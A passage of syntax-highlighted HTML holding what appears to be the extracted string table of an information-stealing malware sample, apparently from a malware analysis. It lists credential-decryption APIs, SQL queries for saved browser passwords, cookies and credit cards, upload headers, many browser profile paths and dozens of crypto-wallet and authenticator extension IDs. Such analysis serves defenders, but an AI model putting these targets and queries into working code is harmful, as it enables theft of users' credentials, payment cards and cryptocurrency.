class="s">'HttpSendRequestA'</span><span class="p">,</span> <span class="s">'HttpQueryInfoA'</span><span class="p">,</span> <span class="s">'InternetCloseHandle'</span><span class="p">,</span> <span class="s">'InternetReadFile'</span><span class="p">,</span> <span class="s">'InternetSetOptionA'</span><span class="p">,</span> <span class="s">'InternetOpenUrlA'</span><span class="p">,</span> <span class="s">'InternetCrackUrlA'</span><span class="p">,</span> <span class="s">'wsprintfA'</span><span class="p">,</span> <span class="s">'CharToOemW'</span><span class="p">,</span> <span class="s">'GetKeyboardLayoutList'</span><span class="p">,</span> <span class="s">'EnumDisplayDevicesA'</span><span class="p">,</span> <span class="s">'ReleaseDC'</span><span class="p">,</span> <span class="s">'GetDC'</span><span class="p">,</span> <span class="s">'GetSystemMetrics'</span><span class="p">,</span> <span class="s">'GetDesktopWindow'</span><span class="p">,</span> <span class="s">'GetWindowRect'</span><span class="p">,</span> <span class="s">'GetWindowDC'</span><span class="p">,</span> <span class="s">'CloseWindow'</span><span class="p">,</span> <span class="s">'RegOpenKeyExA'</span><span class="p">,</span> <span class="s">'RegQueryValueExA'</span><span class="p">,</span> <span class="s">'RegCloseKey'</span><span class="p">,</span> <span class="s">'GetCurrentHwProfileA'</span><span class="p">,</span> <span class="s">'RegEnumKeyExA'</span><span class="p">,</span> <span class="s">'RegGetValueA'</span><span class="p">,</span> <span class="s">'CreateDCA'</span><span class="p">,</span> <span class="s">'GetDeviceCaps'</span><span class="p">,</span> <span class="s">'CreateCompatibleDC'</span><span class="p">,</span> <span class="s">'CreateCompatibleBitmap'</span><span class="p">,</span> <span class="s">'SelectObject'</span><span class="p">,</span> <span class="s">'BitBlt'</span><span class="p">,</span> <span class="s">'DeleteObject'</span><span class="p">,</span> <span class="s">'StretchBlt'</span><span class="p">,</span> <span class="s">'GetObjectW'</span><span class="p">,</span> <span class="s">'GetDIBits'</span><span class="p">,</span> <span class="s">'SaveDC'</span><span class="p">,</span> <span class="s">'CreateDIBSection'</span><span class="p">,</span> <span class="s">'DeleteDC'</span><span class="p">,</span> <span class="s">'RestoreDC'</span><span class="p">,</span> <span class="s">'DsRoleGetPrimaryDomainInformation'</span><span class="p">,</span> <span class="s">'GetModuleFileNameExA'</span><span class="p">,</span> <span class="s">'CryptUnprotectData'</span><span class="p">,</span> <span class="s">'BCryptCloseAlgorithmProvider'</span><span class="p">,</span> <span class="s">'BCryptDestroyKey'</span><span class="p">,</span> <span class="s">'BCryptOpenAlgorithmProvider'</span><span class="p">,</span> <span class="s">'BCryptSetProperty'</span><span class="p">,</span> <span class="s">'BCryptGenerateSymmetricKey'</span><span class="p">,</span> <span class="s">'BCryptDecrypt'</span><span class="p">,</span> <span class="s">'VaultOpenVault'</span><span class="p">,</span> <span class="s">'VaultCloseVault'</span><span class="p">,</span> <span class="s">'VaultEnumerateItems'</span><span class="p">,</span> <span class="s">'VaultGetItemWin8'</span><span class="p">,</span> <span class="s">'VaultGetItemWin7'</span><span class="p">,</span> <span class="s">'VaultFree'</span><span class="p">,</span> <span class="s">'StrCmpCA'</span><span class="p">,</span> <span class="s">'StrStrA'</span><span class="p">,</span> <span class="s">'PathMatchSpecA'</span><span class="p">,</span> <span class="s">'SHGetFolderPathA'</span><span class="p">,</span> <span class="s">'ShellExecuteExA'</span><span class="p">,</span> <span class="s">'GdipGetImageEncodersSize'</span><span class="p">,</span> <span class="s">'GdipGetImageEncoders'</span><span class="p">,</span> <span class="s">'GdipCreateBitmapFromHBITMAP'</span><span class="p">,</span> <span class="s">'GdiplusStartup'</span><span class="p">,</span> <span class="s">'GdiplusShutdown'</span><span class="p">,</span> <span class="s">'GdipSaveImageToStream'</span><span class="p">,</span> <span class="s">'GdipDisposeImage'</span><span class="p">,</span> <span class="s">'GdipFree'</span><span class="p">,</span> <span class="s">'CreateStreamOnHGlobal'</span><span class="p">,</span> <span class="s">'GetHGlobalFromStream'</span><span class="p">,</span> <span class="s">'SymMatchString'</span><span class="p">,</span> <span class="s">'HEAD'</span><span class="p">,</span> <span class="s">'HTTP/1.1'</span><span class="p">,</span> <span class="s">'GET'</span><span class="p">,</span> <span class="s">'POST'</span><span class="p">,</span> <span class="s">'file'</span><span class="p">,</span> <span class="s">'Content-Type: multipart/form-data; boundary=----'</span><span class="p">,</span> <span class="s">'Content-Disposition: form-data; name="'</span><span class="p">,</span> <span class="s">'Content-Disposition: form-data; name="file"; filename="'</span><span class="p">,</span> <span class="s">'Content-Type: application/octet-stream'</span><span class="p">,</span> <span class="s">'Content-Transfer-Encoding: binary'</span><span class="p">,</span> <span class="s">'SOFT: '</span><span class="p">,</span> <span class="s">'PROF: ?'</span><span class="p">,</span> <span class="s">'PROF: '</span><span class="p">,</span> <span class="s">'HOST: '</span><span class="p">,</span> <span class="s">'USER: '</span><span class="p">,</span> <span class="s">'PASS: '</span><span class="p">,</span> <span class="s">'sqlite3_open'</span><span class="p">,</span> <span class="s">'sqlite3_prepare_v2'</span><span class="p">,</span> <span class="s">'sqlite3_step'</span><span class="p">,</span> <span class="s">'sqlite3_column_text'</span><span class="p">,</span> <span class="s">'sqlite3_finalize'</span><span class="p">,</span> <span class="s">'sqlite3_close'</span><span class="p">,</span> <span class="s">'sqlite3_column_bytes'</span><span class="p">,</span> <span class="s">'sqlite3_column_blob'</span><span class="p">,</span> <span class="s">'encrypted_key'</span><span class="p">,</span> <span class="s">'"}'</span><span class="p">,</span> <span class="s">'PATH'</span><span class="p">,</span> <span class="s">'PATH='</span><span class="p">,</span> <span class="s">'NSS_Init'</span><span class="p">,</span> <span class="s">'NSS_Shutdown'</span><span class="p">,</span> <span class="s">'PK11_GetInternalKeySlot'</span><span class="p">,</span> <span class="s">'PK11_FreeSlot'</span><span class="p">,</span> <span class="s">'PK11_Authenticate'</span><span class="p">,</span> <span class="s">'PK11SDR_Decrypt'</span><span class="p">,</span> <span class="s">'SELECT origin_url, username_value, password_value FROM logins'</span><span class="p">,</span> <span class="s">'Cookies</span><span class="se">\\</span><span class="s">%s_%s.txt'</span><span class="p">,</span> <span class="s">'SELECT HOST_KEY, is_httponly, path, is_secure, (expires_utc/1000000)-11644480800, name, encrypted_value from cookies'</span><span class="p">,</span> <span class="s">'TRUE'</span><span class="p">,</span> <span class="s">'FALSE'</span><span class="p">,</span> <span class="s">'Autofill</span><span class="se">\\</span><span class="s">%s_%s.txt'</span><span class="p">,</span> <span class="s">'SELECT name, value FROM autofill'</span><span class="p">,</span> <span class="s">'CC</span><span class="se">\\</span><span class="s">%s_%s.txt'</span><span class="p">,</span> <span class="s">'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards'</span><span class="p">,</span> <span class="s">'Card number: '</span><span class="p">,</span> <span class="s">'</span><span class="se">\n</span><span class="s">Name on card: '</span><span class="p">,</span> <span class="s">'</span><span class="se">\n</span><span class="s">Expiration date: '</span><span class="p">,</span> <span class="s">'History</span><span class="se">\\</span><span class="s">%s_%s.txt'</span><span class="p">,</span> <span class="s">'SELECT url FROM urls'</span><span class="p">,</span> <span class="s">'Downloads</span><span class="se">\\</span><span class="s">%s_%s.txt'</span><span class="p">,</span> <span class="s">'SELECT target_path, tab_url from downloads'</span><span class="p">,</span> <span class="s">'Login Data'</span><span class="p">,</span> <span class="s">'Cookies'</span><span class="p">,</span> <span class="s">'Web Data'</span><span class="p">,</span> <span class="s">'History'</span><span class="p">,</span> <span class="s">'SELECT host, isHttpOnly, path, isSecure, expiry, name, value FROM moz_cookies'</span><span class="p">,</span> <span class="s">'logins.json'</span><span class="p">,</span> <span class="s">'formSubmitURL'</span><span class="p">,</span> <span class="s">'usernameField'</span><span class="p">,</span> <span class="s">'encryptedUsername'</span><span class="p">,</span> <span class="s">'encryptedPassword'</span><span class="p">,</span> <span class="s">'guid'</span><span class="p">,</span> <span class="s">'SELECT fieldname, value FROM moz_formhistory'</span><span class="p">,</span> <span class="s">'SELECT url FROM moz_places'</span><span class="p">,</span> <span class="s">'cookies.sqlite'</span><span class="p">,</span> <span class="s">'formhistory.sqlite'</span><span class="p">,</span> <span class="s">'places.sqlite'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Local State'</span><span class="p">,</span> <span class="s">'..</span><span class="se">\\</span><span class="s">profiles.ini'</span><span class="p">,</span> <span class="s">'C:</span><span class="se">\\</span><span class="s">ProgramData</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> <span class="s">'Chrome'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Google</span><span class="se">\\</span><span class="s">Chrome</span><span class="se">\\</span><span class="s">User Data'</span><span class="p">,</span> <span class="s">'ChromeBeta'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Google</span><span class="se">\\</span><span class="s">Chrome Beta</span><span class="se">\\</span><span class="s">User Data'</span><span class="p">,</span> <span class="s">'ChromeCanary'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Google</span><span class="se">\\</span><span class="s">Chrome SxS</span><span class="se">\\</span><span class="s">User Data'</span><span class="p">,</span> <span class="s">'Chromium'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Chromium</span><span class="se">\\</span><span class="s">User Data'</span><span class="p">,</span> <span class="s">'Edge_Chromium'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Microsoft</span><span class="se">\\</span><span class="s">Edge</span><span class="se">\\</span><span class="s">User Data'</span><span class="p">,</span> <span class="s">'Kometa'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Kometa</span><span class="se">\\</span><span class="s">User Data'</span><span class="p">,</span> <span class="s">'Amigo'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Amigo</span><span class="se">\\</span><span class="s">User Data'</span><span class="p">,</span> <span class="s">'Torch'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Torch</span><span class="se">\\</span><span class="s">User Data'</span><span class="p">,</span> <span class="s">'Orbitum'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Orbitum</span><span class="se">\\</span><span class="s">User Data'</span><span class="p">,</span> <span class="s">'Comodo'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Comodo</span><span class="se">\\</span><span class="s">Dragon</span><span class="se">\\</span><span class="s">User Data'</span><span class="p">,</span> <span class="s">'Nichrome'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Nichrome</span><span class="se">\\</span><span class="s">User Data'</span><span class="p">,</span> <span class="s">'Maxthon5'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Maxthon5</span><span class="se">\\</span><span class="s">Users'</span><span class="p">,</span> <span class="s">'Sputnik'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Sputnik</span><span class="se">\\</span><span class="s">User Data'</span><span class="p">,</span> <span class="s">'EPB'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Epic Privacy Browser</span><span class="se">\\</span><span class="s">User Data'</span><span class="p">,</span> <span class="s">'Vivaldi'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Vivaldi</span><span class="se">\\</span><span class="s">User Data'</span><span class="p">,</span> <span class="s">'CocCoc'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">CocCoc</span><span class="se">\\</span><span class="s">Browser</span><span class="se">\\</span><span class="s">User Data'</span><span class="p">,</span> <span class="s">'Uran'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">uCozMedia</span><span class="se">\\</span><span class="s">Uran</span><span class="se">\\</span><span class="s">User Data'</span><span class="p">,</span> <span class="s">'QIP'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">QIP Surf</span><span class="se">\\</span><span class="s">User Data'</span><span class="p">,</span> <span class="s">'Cent'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">CentBrowser</span><span class="se">\\</span><span class="s">User Data'</span><span class="p">,</span> <span class="s">'Elements'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Elements Browser</span><span class="se">\\</span><span class="s">User Data'</span><span class="p">,</span> <span class="s">'TorBro'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">TorBro</span><span class="se">\\</span><span class="s">Profile'</span><span class="p">,</span> <span class="s">'CryptoTab'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">CryptoTab Browser</span><span class="se">\\</span><span class="s">User Data'</span><span class="p">,</span> <span class="s">'Brave'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">BraveSoftware</span><span class="se">\\</span><span class="s">Brave-Browser</span><span class="se">\\</span><span class="s">User Data'</span><span class="p">,</span> <span class="s">'Opera'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Opera Software</span><span class="se">\\</span><span class="s">Opera Stable</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> <span class="s">'OperaGX'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Opera Software</span><span class="se">\\</span><span class="s">Opera GX Stable</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> <span class="s">'OperaNeon'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Opera Software</span><span class="se">\\</span><span class="s">Opera Neon</span><span class="se">\\</span><span class="s">User Data'</span><span class="p">,</span> <span class="s">'Firefox'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Mozilla</span><span class="se">\\</span><span class="s">Firefox</span><span class="se">\\</span><span class="s">Profiles</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> <span class="s">'SlimBrowser'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">FlashPeak</span><span class="se">\\</span><span class="s">SlimBrowser</span><span class="se">\\</span><span class="s">Profiles</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> <span class="s">'PaleMoon'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Moonchild Productions</span><span class="se">\\</span><span class="s">Pale Moon</span><span class="se">\\</span><span class="s">Profiles</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> <span class="s">'Waterfox'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Waterfox</span><span class="se">\\</span><span class="s">Profiles</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> <span class="s">'Cyberfox'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">8pecxstudios</span><span class="se">\\</span><span class="s">Cyberfox</span><span class="se">\\</span><span class="s">Profiles</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> <span class="s">'BlackHawk'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">NETGATE Technologies</span><span class="se">\\</span><span class="s">BlackHawk</span><span class="se">\\</span><span class="s">Profiles</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> <span class="s">'IceCat'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Mozilla</span><span class="se">\\</span><span class="s">icecat</span><span class="se">\\</span><span class="s">Profiles</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> <span class="s">'KMeleon'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">K-Meleon</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> <span class="s">'Thunderbird'</span><span class="p">,</span> <span class="s">'</span><span class="se">\\</span><span class="s">Thunderbird</span><span class="se">\\</span><span class="s">Profiles</span><span class="se">\\</span><span class="s">'</span><span class="p">,</span> <span class="s">'passwords.txt'</span><span class="p">,</span> <span class="s">'ibnejdfjmmkpcnlpebklmnkoeoihofec'</span><span class="p">,</span> <span class="s">'TronLink'</span><span class="p">,</span> <span class="s">'nkbihfbeogaeaoehlefnkodbefgpgknn'</span><span class="p">,</span> <span class="s">'MetaMask'</span><span class="p">,</span> <span class="s">'fhbohimaelbohpjbbldcngcnapndodjp'</span><span class="p">,</span> <span class="s">'Binance Chain Wallet'</span><span class="p">,</span> <span class="s">'ffnbelfdoeiohenkjibnmadjiehjhajb'</span><span class="p">,</span> <span class="s">'Yoroi'</span><span class="p">,</span> <span class="s">'jbdaocneiiinmjbjlgalhcelgbejmnid'</span><span class="p">,</span> <span class="s">'Nifty Wallet'</span><span class="p">,</span> <span class="s">'afbcbjpbpfadlkmhmclhkeeodmamcflc'</span><span class="p">,</span> <span class="s">'Math Wallet'</span><span class="p">,</span> <span class="s">'hnfanknocfeofbddgcijnmhnfnkdnaad'</span><span class="p">,</span> <span class="s">'Coinbase Wallet'</span><span class="p">,</span> <span class="s">'hpglfhgfnhbgpjdenjgmdgoeiappafln'</span><span class="p">,</span> <span class="s">'Guarda'</span><span class="p">,</span> <span class="s">'blnieiiffboillknjnepogjhkgnoapac'</span><span class="p">,</span> <span class="s">'EQUAL Wallet'</span><span class="p">,</span> <span class="s">'cjelfplplebdjjenllpjcblmjkfcffne'</span><span class="p">,</span> <span class="s">'Jaxx Liberty'</span><span class="p">,</span> <span class="s">'fihkakfobkmkjojpchpfgcmhfjnmnfpi'</span><span class="p">,</span> <span class="s">'BitApp Wallet'</span><span class="p">,</span> <span class="s">'kncchdigobghenbbaddojjnnaogfppfj'</span><span class="p">,</span> <span class="s">'iWallet'</span><span class="p">,</span> <span class="s">'amkmjjmmflddogmhpjloimipbofnfjih'</span><span class="p">,</span> <span class="s">'Wombat'</span><span class="p">,</span> <span class="s">'nlbmnnijcnlegkjjpcfjclmcfggfefdm'</span><span class="p">,</span> <span class="s">'MEW CX'</span><span class="p">,</span> <span class="s">'nanjmdknhkinifnkgdcggcfnhdaammmj'</span><span class="p">,</span> <span class="s">'GuildWallet'</span><span class="p">,</span> <span class="s">'nkddgncdjgjfcddamfgcmfnlhccnimig'</span><span class="p">,</span> <span class="s">'Saturn Wallet'</span><span class="p">,</span> <span class="s">'fnjhmkhhmkbjkkabndcnnogagogbneec'</span><span class="p">,</span> <span class="s">'Ronin Wallet'</span><span class="p">,</span> <span class="s">'cphhlgmgameodnhkjdmkpanlelnlohao'</span><span class="p">,</span> <span class="s">'NeoLine'</span><span class="p">,</span> <span class="s">'nhnkbkgjikgcigadomkphalanndcapjk'</span><span class="p">,</span> <span class="s">'Clover Wallet'</span><span class="p">,</span> <span class="s">'kpfopkelmapcoipemfendmdcghnegimn'</span><span class="p">,</span> <span class="s">'Liquality Wallet'</span><span class="p">,</span> <span class="s">'aiifbnbfobpmeekipheeijimdpnlpgpp'</span><span class="p">,</span> <span class="s">'Terra Station'</span><span class="p">,</span> <span class="s">'dmkamcknogkgcdfhhbddcghachkejeap'</span><span class="p">,</span> <span class="s">'Keplr'</span><span class="p">,</span> <span class="s">'fhmfendgdocmcbmfikdcogofphimnkno'</span><span class="p">,</span> <span class="s">'Sollet'</span><span class="p">,</span> <span class="s">'cnmamaachppnkjgnildpdmkaakejnhae'</span><span class="p">,</span> <span class="s">'Auro Wallet'</span><span class="p">,</span> <span class="s">'jojhfeoedkpkglbfimdfabpdfjaoolaf'</span><span class="p">,</span> <span class="s">'Polymesh Wallet'</span><span class="p">,</span> <span class="s">'flpiciilemghbmfalicajoolhkkenfel'</span><span class="p">,</span> <span class="s">'ICONex'</span><span class="p">,</span> <span class="s">'nknhiehlklippafakaeklbeglecifhad'</span><span class="p">,</span> <span class="s">'Nabox Wallet'</span><span class="p">,</span> <span class="s">'hcflpincpppdclinealmandijcmnkbgn'</span><span class="p">,</span> <span class="s">'KHC'</span><span class="p">,</span> <span class="s">'ookjlbkiijinhpmnjffcofjonbfbgaoc'</span><span class="p">,</span> <span class="s">'Temple'</span><span class="p">,</span> <span class="s">'mnfifefkajgofkcjkemidiaecocnkjeh'</span><span class="p">,</span> <span class="s">'TezBox'</span><span class="p">,</span> <span class="s">'dkdedlpgdmmkkfjabffeganieamfklkm'</span><span class="p">,</span> <span class="s">'Cyano Wallet'</span><span class="p">,</span> <span class="s">'nlgbhdfgdhgbiamfdfmbikcdghidoadd'</span><span class="p">,</span> <span class="s">'Byone'</span><span class="p">,</span> <span class="s">'infeboajgfhgbjpjbeppbkgnabfdkdaf'</span><span class="p">,</span> <span class="s">'OneKey'</span><span class="p">,</span> <span class="s">'cihmoadaighcejopammfbmddcmdekcje'</span><span class="p">,</span> <span class="s">'LeafWallet'</span><span class="p">,</span> <span class="s">'lodccjjbdhfakaekdiahmedfbieldgik'</span><span class="p">,</span> <span class="s">'DAppPlay'</span><span class="p">,</span> <span class="s">'ijmpgkjfkbfhoebgogflfebnmejmfbml'</span><span class="p">,</span> <span class="s">'BitClip'</span><span class="p">,</span> <span class="s">'lkcjlnjfpbikmcmbachjpdbijejflpcm'</span><span class="p">,</span> <span class="s">'Steem Keychain'</span><span class="p">,</span> <span class="s">'onofpnbbkehpmmoabgpcpmigafmmnjhl'</span><span class="p">,</span> <span class="s">'Nash Extension'</span><span class="p">,</span> <span class="s">'bcopgchhojmggmffilplmbdicgaihlkp'</span><span class="p">,</span> <span class="s">'Hycon Lite Client'</span><span class="p">,</span> <span class="s">'klnaejjgbibmhlephnhpmaofohgkpgkd'</span><span class="p">,</span> <span class="s">'ZilPay'</span><span class="p">,</span> <span class="s">'aeachknmefphepccionboohckonoeemg'</span><span class="p">,</span> <span class="s">'Coin98 Wallet'</span><span class="p">,</span> <span class="s">'bfnaelmomeimhlpmgjnjophhpkkoljpa'</span><span class="p">,</span> <span class="s">'Phantom'</span><span class="p">,</span> <span class="s">'hifafgmccdpekplomjjkcfgodnhcellj'</span><span class="p">,</span> <span class="s">'Crypto.com'</span><span class="p">,</span> <span class="s">'dngmlblcodfobpdpecaadgfbcggfjfnm'</span><span class="p">,</span> <span class="s">'Maiar DeFi Wallet'</span><span class="p">,</span> <span class="s">'ppdadbejkmjnefldpcdjhnkpbjkikoip'</span><span class="p">,</span> <span class="s">'Oasis'</span><span class="p">,</span> <span class="s">'hpbgcgmiemanfelegbndmhieiigkackl'</span><span class="p">,</span> <span class="s">'MonstaWallet'</span><span class="p">,</span> <span class="s">'fcckkdbjnoikooededlapcalpionmalo'</span><span class="p">,</span> <span class="s">'MOBOX'</span><span class="p">,</span> <span class="s">'jccapkebeeiajkkdemacblkjhhhboiek'</span><span class="p">,</span> <span class="s">'Crust Wallet'</span><span class="p">,</span> <span class="s">'mgffkfbidihjpoaomajlbgchddlicgpn'</span><span class="p">,</span> <span class="s">'Pali Wallet'</span><span class="p">,</span> <span class="s">'nphplpgoakhhjchkkhmiggakijnkhfnd'</span><span class="p">,</span> <span class="s">'TON Wallet'</span><span class="p">,</span> <span class="s">'ldinpeekobnhjjdofggfgjlcehhmanlj'</span><span class="p">,</span> <span class="s">'Hiro Wallet'</span><span class="p">,</span> <span class="s">'pocmplpaccanhmnllbbkpgfliimjljgo'</span><span class="p">,</span> <span class="s">'Slope Wallet'</span><span class="p">,</span> <span class="s">'bhhhlbepdkbapadjdnnojkbgioiodbic'</span><span class="p">,</span> <span class="s">'Solflare Wallet'</span><span class="p">,</span> <span class="s">'pgiaagfkgcbnmiiolekcfmljdagdhlcm'</span><span class="p">,</span> <span class="s">'Stargazer Wallet'</span><span class="p">,</span> <span class="s">'cgeeodpfagjceefieflmdfphplkenlfk'</span><span class="p">,</span> <span class="s">'EVER Wallet'</span><span class="p">,</span> <span class="s">'gjkdbeaiifkpoencioahhcilildpjhgh'</span><span class="p">,</span> <span class="s">'partisia-wallet'</span><span class="p">,</span> <span class="s">'bgjogpoidejdemgoochpnkmdjpocgkha'</span><span class="p">,</span> <span class="s">'Ecto Wallet'</span><span class="p">,</span> <span class="s">'ifckdpamphokdglkkdomedpdegcjhjdp'</span><span class="p">,</span> <span class="s">'ONTO Wallet'</span><span class="p">,</span> <span class="s">'agechnindjilpccclelhlbjphbgnobpf'</span><span class="p">,</span> <span class="s">'Fractal Wallet'</span><span class="p">,</span> <span class="s">'algblmhagnobbnmakepomicmfljlbehg'</span><span class="p">,</span> <span class="s">'ADS Wallet'</span><span class="p">,</span> <span class="s">'imijjbmbnebfnbmonjeileijahaipglj'</span><span class="p">,</span> <span class="s">'Moonlet Wallet'</span><span class="p">,</span> <span class="s">'kpjdchaapjheajadlaakiiigcbhoppda'</span><span class="p">,</span> <span class="s">'ZEBEDEE'</span><span class="p">,</span> <span class="s">'dlcobpjiigpikoobohmabehhmhfoodbb'</span><span class="p">,</span> <span class="s">'Argent X StarkNet Wallet'</span><span class="p">,</span> <span class="s">'bofddndhbegljegmpmnlbhcejofmjgbn'</span><span class="p">,</span> <span class="s">'X-Wallet'</span><span class="p">,</span> <span class="s">'mapbhaebnddapnmifbbkgeedkeplgjmf'</span><span class="p">,</span> <span class="s">'Biport Wallet'</span><span class="p">,</span> <span class="s">'kfdniefadaanbjodldohaedphafoffoh'</span><span class="p">,</span> <span class="s">'Typhon Wallet'</span><span class="p">,</span> <span class="s">'jaooiolkmfcmloonphpiiogkfckgciom'</span><span class="p">,</span> <span class="s">'Twetch Wallet'</span><span class="p">,</span> <span class="s">'aijcbedoijmgnlmjeegjaglmepbmpkpi'</span><span class="p">,</span> <span class="s">'Leap Wallet'</span><span class="p">,</span> <span class="s">'fhfffofbcgbjjojdnpcfompojdjjhdim'</span><span class="p">,</span> <span class="s">'Lamden Wallet'</span><span class="p">,</span> <span class="s">'agkfnefiabmfpanochlcakggnkdfmmjd'</span><span class="p">,</span> <span class="s">'Earth Wallet'</span><span class="p">,</span> <span class="s">'lpfcbjknijpeeillifnkikgncikgfhdo'</span><span class="p">,</span> <span class="s">'Nami'</span><span class="p">,</span> <span class="s">'fecfflganphcinpahcklgahckeohalog'</span><span class="p">,</span> <span class="s">'Coin Wallet'</span><span class="p">,</span> <span class="s">'ilhaljfiglknggcoegeknjghdgampffk'</span><span class="p">,</span> <span class="s">'Beam Web Wallet'</span><span class="p">,</span> <span class="s">'dklmlehijiaepdijfnbbhncfpcoeeljf'</span><span class="p">,</span> <span class="s">'FShares Wallet'</span><span class="p">,</span> <span class="s">'fkhebcilafocjhnlcngogekljmllgdhd'</span><span class="p">,</span> <span class="s">'WAGMIswap.io Wallet'</span><span class="p">,</span> <span class="s">'laphpbhjhhgigmjoflgcchgodbbclahk'</span><span class="p">,</span> <span class="s">'BLUE - Worlds Safest and Simplest Wallet'</span><span class="p">,</span> <span class="s">'mkjjflkhdddfjhonakofipfojoepfndk'</span><span class="p">,</span> <span class="s">'Unification Web Wallet'</span><span class="p">,</span> <span class="s">'jnldfbidonfeldmalbflbmlebbipcnle'</span><span class="p">,</span> <span class="s">'Infinity Wallet'</span><span class="p">,</span> <span class="s">'ellkdbaphhldpeajbepobaecooaoafpg'</span><span class="p">,</span> <span class="s">'Fetch.ai Network Wallet'</span><span class="p">,</span> <span class="s">'iokeahhehimjnekafflcihljlcjccdbe'</span><span class="p">,</span> <span class="s">'Alby Wallet'</span><span class="p">,</span> <span class="s">'omajpeaffjgmlpmhbfdjepdejoemifpe'</span><span class="p">,</span> <span class="s">'xBull Wallet'</span><span class="p">,</span> <span class="s">'pgojdfajgcjjpjnbpfaelnpnjocakldb'</span><span class="p">,</span> <span class="s">'Sugarchain Wallet'</span><span class="p">,</span> <span class="s">'pnndplcbkakcplkjnolgbkdgjikjednm'</span><span class="p">,</span> <span class="s">'Tronium'</span><span class="p">,</span> <span class="s">'fnnegphlobjdpkhecapkijjdkgcjhkib'</span><span class="p">,</span> <span class="s">'Harmony'</span><span class="p">,</span> <span class="s">'fhilaheimglignddkjgofkcbgekhenbh'</span><span class="p">,</span> <span class="s">'Oxygen'</span><span class="p">,</span> <span class="s">'cmbagcoinhmacpcgmbiniijboejgiahi'</span><span class="p">,</span> <span class="s">'JustLiquidity Wallet'</span><span class="p">,</span> <span class="s">'kmmolakhbgdlpkjkcjkebenjheonagdm'</span><span class="p">,</span> <span class="s">'AlgoSigner'</span><span class="p">,</span> <span class="s">'fnabdmcgpkkjjegokfcnfbpneacddpfh'</span><span class="p">,</span> <span class="s">'Goldmint Lite Wallet'</span><span class="p">,</span> <span class="s">'bgpipimickeadkjlklgciifhnalhdjhe'</span><span class="p">,</span> <span class="s">'GeroWallet'</span><span class="p">,</span> <span class="s">'hoighigmnhgkkdaenafgnefkcmipfjon'</span><span class="p">,</span> <span class="s">'EO.Finance'</span><span class="p">,</span> <span class="s">'nlgnepoeokdfodgjkjiblkadkjbdfmgd'</span><span class="p">,</span> <span class="s">'Multi Wallet'</span><span class="p">,</span> <span class="s">'nhihjlnjgibefgjhobhcphmnckoogdea'</span><span class="p">,</span> <span class="s">'Waves Enterprise Wallet'</span><span class="p">,</span> <span class="s">'ehibhohmlpipbaogcknmpmiibbllplph'</span><span class="p">,</span> <span class="s">'Bluehelix Wallet'</span><span class="p">,</span> <span class="s">'magbanejlegnbcppjljfhnmfmghialkl'</span><span class="p">,</span> <span class="s">'Nebulas Wallet'</span><span class="p">,</span> <span class="s">'fgkaeeikaoeiiggggbgdcjchmdfmamla'</span><span class="p">,</span> <span class="s">'Vtimes'</span><span class="p">,</span> <span class="s">'pnlfjmlcjdjgkddecgincndfgegkecke'</span><span class="p">,</span> <span class="s">'Crocobit Wallet'</span><span class="p">,</span> <span class="s">'bhghoamapcdpbohphigoooaddinpkbai'</span><span class="p">,</span> <span class="s">'Authenticator'</span><span class="p">,</span> <span class="s">'gaedmjdfmmahhbjefcbgaolhhanlaolb'</span><span class="p">,</span> <span class="s">'Authy'</span><span class="p">,</span> <span class="s">'oeljdldpnmdbchonielidgobddffflal'</span><span class="p">,</span> <span class="s">'EOS Authenticator'</span><span class="p">,</span> <span class="s">'ilgcnhelpchnceeipipijaljkblbcobl'</span><span class="p">,</span> <span class="s">'GAuth 